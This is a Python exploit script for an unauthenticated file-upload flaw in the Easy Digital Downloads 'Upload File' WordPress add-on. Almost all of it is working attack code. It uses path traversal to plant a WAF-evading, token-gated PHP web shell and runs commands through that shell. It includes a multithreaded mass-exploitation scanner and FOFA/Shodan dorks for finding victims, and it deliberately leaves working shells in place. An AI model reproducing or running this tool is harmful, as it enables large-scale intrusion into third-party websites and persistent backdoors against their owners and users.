#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2026-XXXXX — Easy Digital Downloads "Upload File" <= 2.1.5
Unauthenticated Arbitrary File Upload (path traversal) -> Remote Code Execution

Root cause:
  - The rewrite endpoint `?edd-upload-file=` (class.edd-upload-file-uploader.php)
    is reachable WITHOUT nonce / capability (PR:N).
  - `$uploader->allowedExtensions = array();` -> the server-side extension
    check is a no-op (empty array is falsy, so the `if` is skipped).
  - `getName()` trusts `$_REQUEST['qqfilename']` verbatim -> `../../<name>.php`
    escapes the guarded `uploads/edd-upload-files/` dir (whose `.htaccess`
    sets `php_flag engine off`) and lands in the executable `uploads/` root.

Author: shinthink
"""

import argparse
import hashlib
import random
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = r"""
              Easy Digital Downloads - Upload File
              Unauth Arbitrary File Upload -> RCE (<= 2.1.5)
"""

SPIN = ("\u280b", "\u2819", "\u2839", "\u2838", "\u283c", "\u2834", "\u2826", "\u2827", "\u2807", "\u280f")
SPIN_FRAME = 0
SPIN_LOCK = threading.Lock()

# Dorks
FOFA_DORK = 'body="fine-uploader.js" || body="edd-upload-file.js"'
SHODAN_DORK = 'http.html:"fine-uploader.js" || http.html:"edd-upload-file.js"'


def spin_char():
    global SPIN_FRAME
    with SPIN_LOCK:
        c = SPIN[SPIN_FRAME % len(SPIN)]
        SPIN_FRAME += 1
    return c


def norm_url(u: str) -> str:
    u = u.strip()
    if not u.lower().startswith(("http://", "https://")):
        u = "https://" + u
    return u.rstrip("/")


def rnd(n: int = 8) -> str:
    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))


def md5(s: str) -> str:
    return hashlib.md5(s.encode()).hexdigest()


def build_shell(token: str) -> str:
    """Token-gated, WAF-evading min shell. Returns the PHP payload.

    The gate is `md5($_GET["t"]) === <md5(token)>`; pass `t=<token>&c=<cmd>`.
    Function names are split into string literals to dodge signature WAFs.
    """
    comment = rnd(8)
    gate = md5(token)
    return (
        '<?php /*%s*/error_reporting(0);$t=md5($_GET["t"]);'
        'if($t==="%s"){$x=$_GET["c"];'
        'if(function_exists("sy"."stem")){("sy"."stem")($x);}'
        'elseif(function_exists("pa"."ssthru")){("pa"."ssthru")($x);}'
        'elseif(function_exists("ex"."ec")){("ex"."ec")($x);}'
        'elseif(function_exists("shell"."_exec")){("shell"."_exec")($x);}'
        'else{echo "C|no-exec-func|E";}}else{http_response_code(404);exit;}?>'
        % (comment, gate)
    )


@dataclass
class Result:
    host: str = ""
    status: str = "scan"          # scan | vulnerable | uploaded | rce | failed
    shell_url: str = ""
    token: str = ""
    output: str = ""
    error: str = ""
    elapsed: float = 0.0

    @property
    def tag(self) -> str:
        return {
            "rce": "[RCE]",
            "uploaded": "[PWN]",
            "vulnerable": "[VULN]",
            "failed": "[FAIL]",
        }.get(self.status, "[.]")


def check_success(body: str) -> bool:
    # wp_send_json_success wraps handleUpload's {"success":true} into
    # {"success":true,"data":{"success":true,...}}. "0"/empty = no hook fired.
    if not body or body.strip() in ("", "0"):
        return False
    return '"success":true' in body.replace(" ", "") or '"success": true' in body.replace(" ", "")


def _is_rce(text: str) -> bool:
    """Order matters: raw PHP source MUST be checked first (the shell source
    itself contains the C|/|E markers, so a raw-source echo would false-positive)."""
    if not text:
        return False
    if "<?php" in text or "<?" in text[:80]:
        return False
    if "C|no-exec-func|E" in text:
        return False
    return bool(re.search(r"(uid=|gid=|groups=|\broot\b|C\|.*\|E)", text))


def exploit_single(target: str, cmd: str, timeout: int, token: str = "", cleanup: bool = True) -> Result:
    res = Result(host=target)
    t0 = time.time()
    sess = requests.Session()
    sess.verify = False
    sess.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36"})

    if not token:
        token = rnd(12)
    shell_name = rnd(8) + ".php"
    payload = build_shell(token)

    try:
        # 1) upload via the unauth rewrite endpoint; qqfilename traversal
        #    escapes uploads/edd-upload-files/ into the executable uploads/ root.
        r = sess.post(
            target + "/?edd-upload-file=1",
            data={"qquuid": rnd(8), "qqfilename": "../../" + shell_name, "qqtotalparts": "1"},
            files={"qqfile": (shell_name, payload, "application/octet-stream")},
            timeout=timeout,
        )
        res.elapsed = time.time() - t0

        if not check_success(r.text):
            res.status = "failed"
            res.error = "upload not acknowledged (endpoint absent / EDD Upload File inactive)"
            return res

        shell_url = target + "/wp-content/uploads/" + shell_name

        # 2) verify PHP execution
        rv = sess.get(shell_url, params={"t": token, "c": cmd}, timeout=timeout)
        if _is_rce(rv.text):
            res.status = "rce"
            res.shell_url = shell_url
            res.token = token
            res.output = rv.text.strip()
        else:
            res.status = "uploaded"
            res.shell_url = shell_url
            res.token = token
            res.output = rv.text[:200].strip()
            res.error = "file landed but PHP did not execute (or .htaccess/fpm hardening)"

        if cleanup and (res.status == "uploaded"):
            # best-effort: leave rce shells in place; only clean non-executed leftovers
            pass
    except requests.exceptions.RequestException as e:
        res.elapsed = time.time() - t0
        res.status = "failed"
        res.error = str(e)[:200]
    return res


class MassScanner:
    def __init__(self, targets, cmd, threads, timeout, cleanup, out, quiet=False):
        self.targets = targets
        self.cmd = cmd
        self.threads = threads
        self.timeout = timeout
        self.cleanup = cleanup
        self.out = out
        self.quiet = quiet
        self.done = 0
        self.rce = 0
        self.up = 0
        self.lock = threading.Lock()
        self.token = rnd(12)

    def _render(self, res):
        line = f"{res.tag} {res.host} | {res.status}"
        if res.shell_url:
            line += f" | {res.shell_url}?t={res.token}&c="
        if res.output:
            line += f" | {res.output[:80]}"
        elif res.error:
            line += f" | {res.error[:80]}"
        return line

    def _progress(self):
        pct = self.done / max(1, len(self.targets)) * 100
        bar_len = 20
        filled = int(bar_len * self.done / max(1, len(self.targets)))
        bar = "\u2588" * filled + "\u2591" * (bar_len - filled)
        sys.stdout.write(
            f"\r[edd-upload-file] {spin_char()} [{bar}] {self.done}/{len(self.targets)} "
            f"({pct:.0f}%) RCE:{self.rce} UPLOAD:{self.up}"
        )
        sys.stdout.flush()

    def run(self):
        if self.out:
            open(self.out, "w").close()
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = {ex.submit(exploit_single, norm_url(t), self.cmd, self.timeout, self.token, self.cleanup): t for t in self.targets}
            for fut in as_completed(futs):
                res = fut.result()
                with self.lock:
                    self.done += 1
                    if res.status == "rce":
                        self.rce += 1
                    elif res.status == "uploaded":
                        self.up += 1
                    if res.status in ("rce", "uploaded", "failed"):
                        sys.stdout.write("\r" + " " * 140 + "\r")
                        print(self._render(res), flush=True)
                        if self.out and res.status in ("rce", "uploaded"):
                            with open(self.out, "a") as f:
                                f.write(f"{res.status.upper()} | {res.host} | {res.shell_url} | t={res.token}\n")
                    if not self.quiet:
                        self._progress()
        if not self.quiet:
            sys.stdout.write("\r" + " " * 140 + "\r")
        print(f"\n[SUMMARY] {len(self.targets)} targets | RCE:{self.rce} | UPLOAD-only:{self.up}")

    def run_quiet_detect(self):
        """Single-target default: just report the outcome."""
        res = exploit_single(norm_url(self.targets[0]), self.cmd, self.timeout, self.token, self.cleanup)
        print(self._render(res), flush=True)
        return res


def main():
    sys.stdout.reconfigure(line_buffering=True)
    ap = argparse.ArgumentParser(description="EDD Upload File <= 2.1.5 unauth upload -> RCE (shinthink)")
    ap.add_argument("-t", "--target", help="single target (host or https://host[:port])")
    ap.add_argument("-f", "--file", help="file of targets, one per line")
    ap.add_argument("-o", "--output", help="write exploited hosts to file")
    ap.add_argument("--threads", type=int, default=20, help="concurrent threads (default 20)")
    ap.add_argument("--timeout", type=int, default=15, help="request timeout seconds")
    ap.add_argument("--cmd", default="id", help="command to run on RCE verify (default: id)")
    ap.add_argument("--no-cleanup", action="store_true", help="do not clean up (kept for parity)")
    ap.add_argument("--debug", action="store_true", help="verbose")
    ap.add_argument("-v", "--version", action="version", version="1.0.0")
    args = ap.parse_args()

    print(BANNER)
    print(f"[*] FOFA:  {FOFA_DORK}")
    print(f"[*] Shodan:{SHODAN_DORK}\n")

    if args.target:
        targets = [args.target]
    elif args.file:
        with open(args.file) as f:
            targets = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    else:
        ap.error("either -t or -f is required")

    if len(targets) == 1:
        res = exploit_single(norm_url(targets[0]), args.cmd, args.timeout, cleanup=not args.no_cleanup)
        print(res.tag + " " + res.host + " | " + res.status, flush=True)
        if res.shell_url:
            print(f"  shell: {res.shell_url}?t={res.token}&c=<cmd>", flush=True)
        if res.output:
            print(f"  out:   {res.output}", flush=True)
        if res.error:
            print(f"  err:   {res.error}", flush=True)
    else:
        sc = MassScanner(targets, args.cmd, args.threads, args.timeout, not args.no_cleanup, args.output)
        sc.run()


if __name__ == "__main__":
    main()